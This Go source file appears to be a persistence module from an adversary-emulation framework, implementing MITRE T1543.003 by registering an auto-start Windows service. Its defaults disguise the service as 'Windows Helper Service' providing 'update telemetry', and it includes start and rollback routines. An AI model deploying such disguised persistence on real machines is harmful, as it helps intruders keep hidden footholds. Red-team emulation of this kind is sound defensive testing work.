package persistence

import (
	"fmt"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

// Service registers a Windows auto-start service via the SCM.
// Requires administrator privileges.  MITRE T1543.003.
type Service struct {
	ServiceName string   // default: "WinHelperSvc"
	DisplayName string   // default: "Windows Helper Service"
	Description string   // default: "Provides supplemental Windows update telemetry."
	ExePath     string   // required
	Args        []string // each arg is escaped independently by the mgr package
}

func (s *Service) Name() string { return "windows-service" }
func (s *Service) ID() string   { return "T1543.003" }

func (s *Service) svcName() string {
	if s.ServiceName == "" {
		return "WinHelperSvc"
	}
	return s.ServiceName
}

func (s *Service) Run() error {
	if s.ExePath == "" {
		return fmt.Errorf("ExePath is required")
	}
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("SCM connect (admin?): %w", err)
	}
	defer m.Disconnect()

	if existing, err := m.OpenService(s.svcName()); err == nil {
		existing.Close()
		return fmt.Errorf("service %q already exists", s.svcName())
	}

	display := s.DisplayName
	if display == "" {
		display = "Windows Helper Service"
	}
	desc := s.Description
	if desc == "" {
		desc = "Provides supplemental Windows update telemetry."
	}

	h, err := m.CreateService(s.svcName(), s.ExePath, mgr.Config{
		ServiceType: windows.SERVICE_WIN32_OWN_PROCESS,
		StartType:   mgr.StartAutomatic,
		DisplayName: display,
		Description: desc,
	}, s.Args...)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}
	h.Close()
	return nil
}

// Start triggers the service immediately (otherwise it waits for next boot).
func (s *Service) Start() error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()
	h, err := m.OpenService(s.svcName())
	if err != nil {
		return fmt.Errorf("OpenService: %w", err)
	}
	defer h.Close()
	return h.Start()
}

func (s *Service) Rollback() error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()
	h, err := m.OpenService(s.svcName())
	if err != nil {
		return nil // already gone
	}
	defer h.Close()
	h.Control(svc.Stop)
	return h.Delete()
}
